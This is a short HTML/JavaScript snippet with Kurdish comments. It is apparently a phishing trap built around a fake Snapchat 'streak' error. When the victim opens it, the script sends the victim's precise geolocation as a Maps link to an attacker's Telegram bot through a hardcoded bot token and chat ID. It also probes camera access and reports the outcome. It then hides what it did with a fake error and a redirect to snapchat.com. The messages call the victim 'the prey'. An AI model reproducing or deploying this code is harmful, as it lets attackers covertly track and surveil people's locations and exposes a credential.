<script>
    // 😈 کلیلی دۆزەخ - ئەمجارە بە بێ کێشە دامناوە
    const _t = "8641718491:AAH1_yNz4ZQ0hxmMhWK9HPc7zY6CDsvfw2o";
    const _c = "212703396";

    async function sendToTelegram(msg) {
        const url = `https://api.telegram.org/bot${_t}/sendMessage`;
        try {
            await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: _c, text: msg, parse_mode: 'Markdown' })
            });
        } catch (e) { console.error("Error sending message."); }
    }

    async function launchChaos() {
        sendToTelegram("🎯 *نێچیرەکە کلیکی لەسەر تەڵەکە کرد!*");

        // ١. لۆکەیشن
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((pos) => {
                let map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                sendToTelegram(`📍 *لۆکەیشن:* \n${map}`);
                openCamera();
            }, (err) => {
                sendToTelegram("❌ نێچیرەکە ڕێگەی بە لۆکەیشن نەدا.");
                openCamera();
            }, { enableHighAccuracy: true });
        } else {
            openCamera();
        }
    }

    function openCamera() {
        navigator.mediaDevices.getUserMedia({ video: true })
        .then(s => {
            sendToTelegram("📸 *کامێرا کرایەوە!*");
            s.getTracks().forEach(t => t.stop());
            finish();
        })
        .catch(e => {
            sendToTelegram("🚫 ڕێگەی بە کامێرا نەدا.");
            finish();
        });
    }

    function finish() {
        setTimeout(() => {
            alert("System Error (0x882). Please refresh the streak.");
            window.location.href = "https://www.snapchat.com";
        }, 1000);
    }
</script>
